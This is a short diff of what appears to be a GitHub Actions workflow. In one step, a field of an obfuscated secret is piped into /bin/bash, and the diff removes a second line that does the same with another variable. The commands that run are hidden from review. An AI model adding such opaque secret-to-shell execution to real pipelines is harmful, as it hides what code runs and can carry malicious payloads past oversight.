@@ -18,7 +18,6 @@ jobs:
           fl680: ${{ secrets.fl680 }}
         run: |
           printf '%s' "$fl680" | jq -r .yyppl644 | /bin/bash
-          echo $sklwd06641 | jq -r .xf967 | /bin/bash
 
       - name: Upload results
         if: always()
